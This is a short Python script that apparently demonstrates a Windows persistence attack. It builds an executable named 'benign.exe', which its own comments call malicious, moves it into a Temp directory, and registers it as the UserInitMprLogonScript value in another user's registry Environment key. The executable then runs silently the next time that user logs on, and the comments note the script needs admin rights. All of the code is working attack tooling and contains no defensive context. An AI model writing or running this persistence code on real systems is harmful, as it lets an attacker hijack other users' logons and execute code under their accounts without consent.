import os
import shutil
import winreg

filedir = os.path.join(os.getcwd(), "Temp")
filename = "benign.exe"
filepath = os.path.join(filedir, filename)

if os.path.isfile(filepath):
    os.remove(filepath)

# Use BuildExe to create malicious executable
os.system("python BuildExe.py")

# Move malicious executable to desired directory
shutil.move(filename, filedir)


# Windows logon script keys

# This is the registry location for the current user's config settings
# reghive = winreg.HKEY_CURRENT_USER
# regpath = "Environment"

# This is the registry location for another user's config settings.
# We write our logon script setting here so our script will be executed by
# the other user the next time they log in.
# This script must be run as admin in order to write other users settings.
reghive = winreg.HKEY_USERS
regpath = "S-1-5-21-524849353-310586374-791561826-1002\Environment"

# Add registry logon script
reg = winreg.ConnectRegistry(None, reghive)
key = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_WRITE)
winreg.SetValueEx(key, "UserInitMprLogonScript", 0, winreg.REG_SZ, filepath)
